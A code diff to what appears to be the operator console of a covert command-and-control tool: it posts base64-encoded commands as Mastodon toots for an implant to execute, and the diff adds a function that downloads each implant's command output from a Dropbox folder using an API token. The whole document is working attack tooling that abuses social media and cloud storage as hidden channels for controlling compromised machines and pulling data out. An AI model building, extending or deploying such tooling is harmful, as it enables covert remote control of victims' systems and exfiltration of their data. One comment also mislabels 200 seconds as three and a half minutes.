@@ -1,8 +1,11 @@
+#!/usr/bin/python3
+
 import os
 import toml
 import base64
 import requests
 import time
+import dropbox
 import alive_progress
 
 def prompt():
@@ -22,13 +25,16 @@ def prompt():
 
 # Get url and auth token from a toml file
 def get_url_and_auth_token():
-    # Define the url and auth token as global variables
-    global url, auth_token
+    # Define the url, auth token and dropbox_token as global variables
+    global url, auth_token, dropbox_token
 
-    # Get the url and auth token from the config file
+    # Get the url and auth token for the mastadon instance from the config file
     config = toml.load("config.toml")
-    url = config["url"]
+    url = config["server"]
     auth_token = config["auth_token"]
+
+    # Get the dropbox token from the config file
+    dropbox_token = config["dropbox_token"]
 
 def post_toot(command):
     # Encode command to base64
@@ -47,7 +53,7 @@ def post_toot(command):
     requests.post(url_api, headers=auth, data=data)
 
 def wait():
-    wait_time =  3 * 60 # 3 minutes
+    wait_time = 3 * 60 + 20 # 3 minutes and 30 seconds
     
     # Wait for command to be executed
     with alive_progress.alive_bar(wait_time, bar="blocks", spinner="classic", title="Waiting for command to be executed") as bar:
@@ -57,6 +63,19 @@ def wait():
 
     # Remove the progress bar print
     print("\033[A" + 120 * " " + "\033[A")
+
+def getOutput(impID):
+    # Get output from dropbox file
+    dbx = dropbox.Dropbox(dropbox_token)
+
+    # Get the output file
+    output = dbx.files_download("/output/" + impID + "_output.txt")[1].content
+
+    # Decode output and remove trailing new line
+    output = output.decode("utf-8").rstrip()
+
+    # Print output
+    print(output)
 
 def serve():
     previous_command = ""
@@ -86,13 +105,16 @@ def serve():
         # Wait for command to be executed
         wait()
 
+        # Get output
+        getOutput("00000001")
+
 # main function
 def main():
     # Get url and auth token
     try:
         get_url_and_auth_token()
     except:
-        print("[!] Error: Could not get url and auth token from config file")
+        print("[!] Error: Could not get url, auth token and Dropbox token from config file")
         exit()
 
     # Print prompt
